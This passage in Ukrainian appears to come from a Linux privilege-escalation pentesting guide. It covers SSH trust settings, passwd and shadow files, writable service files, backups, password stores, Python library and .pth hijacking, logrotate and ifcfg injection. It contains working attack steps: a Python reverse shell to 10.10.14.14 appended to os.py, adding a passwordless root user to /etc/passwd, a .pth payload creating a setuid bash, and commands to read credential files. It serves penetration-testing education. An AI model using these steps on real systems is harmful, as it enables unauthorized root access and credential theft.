Закритий ключ CA також можна використати **без доступу поточного користувача до нього для читання**, якщо правило делегування привілеїв дозволяє цьому користувачу виконати необмежену [команду підписування сертифікатів, наприклад `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), від імені власника ключа. Зіставте точну дозволену команду й аргументи з доступом облікового запису підписувача до ключа, відкритим ключем CA, якому довіряє чинна конфігурація sshd, принципалом, прийнятним для цільового облікового запису, терміном дії сертифіката та політикою входу цього облікового запису. Делегована команда підписування або сам файл довіреного CA не доводять наявність доступу до іншого облікового запису; не підписуйте тестовий сертифікат під час пасивного збору даних.

Окремий спосіб налаштування довіри до CA для облікового запису описано в розділі [Плутанина з роздільником principal у сертифікаті SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Указує файли, що містять відкриті ключі, які можна використовувати для автентифікації користувача. У ньому можуть бути такі токени, як `%h`, які замінюються на домашній каталог. **Можна вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ця конфігурація вказує, що коли ви спробуєте ввійти за допомогою **приватного** ключа користувача "**testusername**", SSH порівняє відкритий ключ вашого ключа з ключами, розташованими в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Пересилання SSH-агента дає змогу **використовувати локальні SSH-ключі, замість того щоб залишати ключі** (без парольних фраз!) на сервері. Отже, ви зможете **під’єднатися** через SSH **до хоста**, а звідти **під’єднатися до іншого хоста, використовуючи** **ключ**, розташований на вашому **початковому хості**.

Потрібно встановити цей параметр у `$HOME/.ssh.config` ось так:

```
Host example.com
  ForwardAgent yes
```

Зверніть увагу: якщо `Host` має значення `*`, щоразу, коли користувач переходить на іншу машину, цей хост матиме доступ до ключів (це проблема безпеки).

Файл `/etc/ssh_config` може **перевизначити** ці **параметри** й дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволити** або **заборонити** пересилання ssh-agent за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням дозволено).

Якщо ви виявите, що в середовищі налаштовано Forward Agent, прочитайте таку сторінку: **можливо, вам вдасться зловживати цією функцією для підвищення привілеїв**:

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записувати або змінювати будь-який із них, ви можете підвищити привілеї**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Якщо знайдено якийсь незвичний скрипт профілю, слід перевірити його на наявність **конфіденційних даних**.

### Файли Passwd/Shadow

Залежно від ОС, файли `/etc/passwd` і `/etc/shadow` можуть мати інші назви або резервні копії. Тому рекомендується **знайти всі такі файли** та **перевірити, чи можна їх прочитати**, щоб з’ясувати, **чи є в них хеші**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

У деяких випадках **хеші паролів** можна знайти у файлі `/etc/passwd` (або його аналогу)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з таких команд.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Потім додайте користувача hacker і згенерований пароль.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер можна використовувати команду `su` з обліковими даними `hacker:hacker`

Або скористайтеся наведеними нижче рядками, щоб додати тестового користувача без пароля.\
ПОПЕРЕДЖЕННЯ: це може знизити поточний рівень безпеки машини.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

ПРИМІТКА: На платформах BSD `/etc/passwd` розташований у файлах `/etc/pwd.db` і `/etc/master.passwd`, а `/etc/shadow` перейменовано на `/etc/spwd.db`.

Перевірте, чи можете ви **записувати до деяких чутливих файлів**. Наприклад, чи можете ви записувати до якогось **файлу конфігурації служби**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Наприклад, якщо на машині запущено сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat у /etc/systemd/,** тоді ви можете змінити рядки:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Your backdoor буде виконано під час наступного запуску Tomcat.

### Незвичне розташування/файли, що належать вам

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

Пароль, введений у звичайний запит `sudo`, не зберігається в історії команд оболонки; наступний рядок може бути випадковим введенням у оболонку, але не є доказом того, що це правильний пароль. Маркер `.sudo_as_admin_successful` фіксує попереднє використання, а не поточну авторизацію.

### **Резервні копії**

Перевіряйте файли, доступні для читання в каталогах резервних копій, а також файли, у **назвах** яких є `backup`: архів із незрозумілою назвою або зашифрованим розширенням усе одно може містити старі дані застосунку. Зашифрований архів — лише потенційне джерело витоку. Відновлення пароля, перевірка вмісту архіву, відновлення хешу застосунку та повторне використання цього пароля для облікового запису Unix — окремі кроки, які потрібно перевірити; наявність хешу в архіві не доводить, що ним можна увійти до локальної системи.

Доступні для читання резервні копії віртуальних машин потребують такої самої перевірки. Конфігурація VirtualBox `.vbox` може вказувати на підключені образи `.vdi` та містити метадані ключа шифрування диска; [у документації VirtualBox зазначено, що ключ шифрування даних зберігається в конфігурації віртуальної машини](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Для перевірки диска в автономному режимі мають бути доступні і конфігурація, і образ. У гостьового тому може бути власний [рівень шифрування LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), для якого потрібен окремий ключ. Навіть після дозволеного розшифрування старі скрипти або конфігурації можуть містити пароль; перш ніж вважати це локальним підвищенням привілеїв, з’ясуйте, чи є облікові дані чинними для облікового запису хоста та чи дозволяє ефективна політика `sudo` виконувати привілейовану команду. Під час пасивного переліку перевіряйте шляхи та дозволи, не копіюючи, не розшифровуючи й не монтувавши образи.

Під час перевірки доступного для читання архіву спочатку перегляньте список імен файлів, не розпаковуючи його: там можуть бути приховані файли автентифікації, матеріали з кодами відновлення або SSH-ключі, навіть якщо активні копії захищені. Імена файлів лише вказують на можливий напрямок перевірки; окремо перевірте вміст і повторне використання облікових даних.

Насамперед перевіряйте **доступні для читання архіви, власником яких є інший користувач**, у каталогах резервних копій, особливо архіви, власником яких є root, і ті, що доступні через членство в групі. Старий архів може містити конфігурацію або секрет автентифікації, навіть якщо активна копія захищена. Для локального інтерфейсу керування резервними копіями, як-от [Backrest](https://garethgeorge.github.io/backrest/), перевірте, від імені якого облікового запису фактично працює служба, а також чи може користувач із нижчим рівнем привілеїв читати її конфігурацію або автентифікуватися в інтерфейсі. Його [hooks](https://garethgeorge.github.io/backrest/docs/hooks) та [інтерфейс команд restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) можуть використовувати файлові й командні привілеї демона; сама лише loopback-прив’язка не визначає рівень впливу. `passwordBcrypt` у Backrest — це bcrypt-хеш у кодуванні base64, наведений у його [коді автентифікації](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), а не пароль у відкритому вигляді. Перш ніж вважати відкритий архів або інтерфейс межею привілеїв, підтвердьте ідентичність служби, наявність придатних облікових даних і доступ до відповідного плану або сховища.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який можна використати для цього, — [**LaZagne**](https://github.com/AlessandroZ/LaZagne), застосунок із відкритим кодом для отримання багатьох паролів, збережених на локальному комп’ютері з Windows, Linux або Mac.

Якщо файл `/etc/guacamole/guacamole.properties` доступний для читання, перевірте налаштування підключення до бази даних `mysql-*`, `postgresql-*` або `sqlserver-*`. Якщо обліковий запис має дозвіл читати таблиці Guacamole JDBC, таблиця `guacamole_connection_parameter` може містити збережені значення `username`, `password`, `private-key` або `passphrase` для SSH. Спочатку перегляньте ідентифікатори підключень і назви параметрів, а потім — лише відповідні рядки; збережене значення може бути динамічним токеном або посиланням на сховище секретів, а не придатним до повторного використання секретом. Див. [схему Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) та [параметри підключення SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Менеджер паролів pswm](https://github.com/Julynx/pswm#usage) за замовчуванням зберігає зашифроване сховище у `~/.local/share/pswm/pswm`. Якщо сховище іншого користувача видно, перевірте його власника та чи справді ваш обліковий запис має до нього доступ на читання. Сам шлях до сховища не розкриває облікових даних: відновлення головного пароля, пошук пароля облікового запису, який можна використати повторно, і перевірка привілеїв цього облікового запису — окремі кроки.

[База даних Passpie за замовчуванням](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) розташована в `~/.passpie/`; вона містить сховище ключів `.keys` і зашифровані файли облікових даних `.pass` у групових каталогах. Видимий каталог бази даних — лише підказка щодо шляху: перевірте доступ до ключа й відповідного зашифрованого запису, наявність потрібної головної парольної фрази та те, чи належать відновлені облікові дані привілейованішому обліковому запису. Passpie також підтримує [власні шляхи до баз даних](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), тому шлях за замовчуванням не охоплює всі можливі варіанти. Автоматизоване перерахування має показувати метадані, не експортуючи облікові дані й не виводячи матеріал ключа.

## Файли з правом запису

### Перехоплення Python-бібліотеки

Якщо ви знаєте, **звідки** буде запущено python-скрипт, і **можете записувати у** цю папку або **змінювати Python-бібліотеки**, ви можете змінити бібліотеку ОС і додати до неї backdoor (якщо ви можете записувати в папку, з якої буде запущено python-скрипт, скопіюйте й вставте туди бібліотеку os.py).

Щоб **додати backdoor до бібліотеки**, просто додайте в кінець бібліотеки os.py такий рядок (змініть IP і PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Writable `.pth`, оброблюваний через `site.addsitedir()`

Не вважайте `site.addsitedir(DIR)` еквівалентом `sys.path.append(DIR)`. Ця функція також обробляє кожен файл `*.pth` у `DIR`. Рядок, що починається з `import`, за яким іде пробіл або табуляція, виконується як код Python. Рядки зі шляхами натомість трактуються відносно каталогу site і додаються лише тоді, коли відповідні шляхи існують.<sup>[[38]](#references)</sup>

Це дає змогу підвищити привілеї, коли програма Python, дозволена через sudo або запущена з іншими підвищеними привілеями, викликає `site.addsitedir()` для каталогу, доступного для запису поточному користувачеві або одній із його груп. Код із `.pth` виконується під час налаштування шляху імпорту привілейованою програмою, ще до виконання її основної дії.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Виконуваний вміст `.pth` має міститися в одному рядку, але крапка з комою дає змогу розмістити кілька інструкцій. Наприклад, шлях виконання від root може створити копію Bash із setuid-бітом; запускайте Bash із параметром `-p`, щоб зберегти його ефективний ID.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Параметр `-S` лише вимикає автоматичну ініціалізацію Python `site`. Він не захищає програму, яка явно імпортує `site` і викликає `site.addsitedir()`. Видаліть каталоги, доступні для запису зловмиснику, зі шляхів імпорту привілейованих програм і вимагайте, щоб каталог і його файли `.pth` належали лише привілейованому адміністратору та були доступні для запису лише йому.<sup>[[38]](#references)[[39]](#references)</sup>

### Експлуатація logrotate

Привілейоване завдання `logrotate` може створити шлях для запису файлів від імені іншого користувача, якщо воно справді ротуює журнал у каталозі, який користувач із нижчими привілеями може замінити або перенаправити під час ротації. Сам по собі журнал із доступом для запису — лише зачіпка. Перевірте точне активне правило та директиви `create`, `olddir` і `su`; ефективну ідентичність планувальника; права на запис і пошук у батьківському каталозі журналу; а також те, чи дозволяють встановлена збірка та політика змінити призначення. Щоб запис у файл запуску перетворився на виконання команд, пізніше привілейована оболонка також має завантажити створений файл. Перевірте розклад, правило, версію/пакування та метадані шляху, не запускаючи ротацію й не намагаючись скористатися гонкою.

> [!TIP]
> Не вважайте `3.18.0` чи будь-який рядок версії єдиною межею експлуатації. [Журнал змін upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) містить відомості про посилення перевірок каталогів і символічних посилань у кількох випусках, а дистрибутиви можуть переносити виправлення у свої версії. В [інструкції upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) рекомендується використовувати `su`, коли root ротуює журнали в каталогах, контрольованих непривілейованими користувачами; перевірте ефективне правило й фактичну поведінку.

Докладнішу інформацію про вразливість наведено на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Цю вразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(журнали nginx),** тому щоразу, коли виявляєте, що можете змінювати журнали, перевірте, хто ними керує, і чи можете ви підвищити привілеї, замінивши журнали символічними посиланнями.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Посилання на вразливість:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Файл `ifcfg-*` є зачіпкою для перевірки, якщо користувач із нижчими привілеями може створити або змінити його **і** привілейований шлях активації мережі зчитує саме цей файл. Перевірте фактичні права на файл і каталог, вибраний інтерфейс, встановлену реалізацію `ifup`/`ifdown` і те, хто її викликає. Самого доступу до запису у файл недостатньо для виконання команд. [Посібник Red Hat з мереж у RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) розрізняє застарілі мережеві скрипти та NetworkManager: останній сам по собі не запускає перші. [Документація RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) зазначає, що за замовчуванням `ifup`/`ifdown` використовують NetworkManager, тоді як додатковий застарілий пакет містить shell-скрипти.

У системі, яка справді використовує привілейовані застарілі скрипти, присвоєння в `ifcfg-*` на кшталт `NAME=`, що не взяте в лапки й обробляється як shell-код, може перетнути межу виконання коду. Перевірте точний парсер, значення та шлях активації; не робіть висновків про інтерпретацію shell-кодом лише з назви файлу чи наявності NetworkManager. Обгортка, дозволена через sudo, яка записує введені користувачем дані у файл `ifcfg-*`, а потім викликає застарілий `ifup`, є окремим шляхом до цієї межі, навіть якщо користувач не може безпосередньо змінювати файл.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd і rc.d**

У каталозі `/etc/init.d` містяться **скрипти** для System V init (SysVinit) — **класичної системи керування службами Linux**. Вони дають змогу `start`, `stop`, `restart`, а іноді й `reload` служб. Їх можна запускати безпосередньо або через символічні посилання в `/etc/rc?.d/`. В системах Redhat використовується також альтернативний шлях: `/etc/rc.d/init.d`.

Натомість `/etc/init` пов’язаний з **Upstart** — новішою системою **керування службами**, запровадженою в Ubuntu. Для завдань керування службами вона використовує файли конфігурації. Попри перехід на Upstart, скрипти SysVinit продовжують використовуватися разом із конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** — це сучасний менеджер ініціалізації та служб, який пропонує розширені функції, як-от запуск демонів на вимогу, керування automount і створення знімків стану системи. Файли дистрибутивних пакетів зберігаються в `/usr/lib/systemd/`, а зміни адміністратора — у `/etc/systemd/system/`, що спрощує адміністрування системи.<sup>[[21]](#references)</sup>
